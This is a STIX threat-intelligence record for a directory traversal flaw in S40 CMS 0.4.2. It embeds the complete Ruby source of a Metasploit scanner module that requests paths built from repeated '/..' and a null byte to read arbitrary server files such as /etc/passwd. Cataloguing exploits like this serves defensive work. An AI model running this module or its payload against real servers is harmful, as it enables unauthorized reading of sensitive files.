{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f90a80a0-b23d-48b4-8417-e4d13a76393f",
    "created": "2024-08-14T16:31:12.135879Z",
    "modified": "2024-08-14T16:31:12.135882Z",
    "name": "S40 0.4.2 CMS Directory Traversal Vulnerability",
    "description": " This module exploits a directory traversal vulnerability found in S40 CMS. The flaw is due to the 'page' function not properly handling the $pid parameter which allows a malicious user to load an arbitrary file path.  'References'     => [ [ 'OSVDB', '82469'] [ 'EDB', '17129' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/s40_traversal.rb",
            "external_id": "s40_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'S40 0.4.2 CMS Directory Traversal Vulnerability',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability found in S40 CMS.\n        The flaw is due to the 'page' function not properly handling the $pid parameter,\n        which allows a malicious user to load an arbitrary file path.\n      },\n      'References'     =>\n        [\n          [ 'OSVDB', '82469'],\n          [ 'EDB', '17129' ]\n        ],\n      'Author'         =>\n        [\n          'Osirys <osirys[at]autistici.org>',  #Discovery, PoC\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2011-04-07'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new(\"TARGETURI\", [true, 'The base path to S40', '/s40/']),\n        OptString.new(\"FILE\", [true, 'The file to retrieve', '/etc/passwd']),\n        OptBool.new('SAVE', [false, 'Save the HTTP body', false]),\n        OptInt.new(\"DEPTH\", [true, 'Traversal depth', 10])\n      ])\n  end\n\n  def run_host(ip)\n    uri = target_uri.path\n    uri << '/' if uri[-1, 1] != '/'\n\n    t = \"/..\" * datastore['DEPTH']\n\n    vprint_status(\"Retrieving #{datastore['FILE']}\")\n\n    # No permission to access.log or proc/self/environ, so this is all we do :-/\n    uri = normalize_uri(uri, 'index.php')\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"#{uri}/?p=#{t}#{datastore['FILE']}%00\"\n    })\n\n    if not res\n      vprint_error(\"Server timed out\")\n    elsif res and res.body =~ /Error 404 requested page cannot be found/\n      vprint_error(\"Either the file doesn't exist, or you don't have the permission to get it\")\n    else\n      # We don't save the body by default, because there's also other junk in it.\n      # But we still have a SAVE option just in case\n      print_good(\"#{datastore['FILE']} retrieved\")\n      vprint_line(res.body)\n\n      if datastore['SAVE']\n        p = store_loot(\n          's40.file',\n          'application/octet-stream',\n          rhost,\n          res.body,\n          ::File.basename(datastore['FILE'])\n        )\n        print_good(\"File saved as: #{p}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-07"
}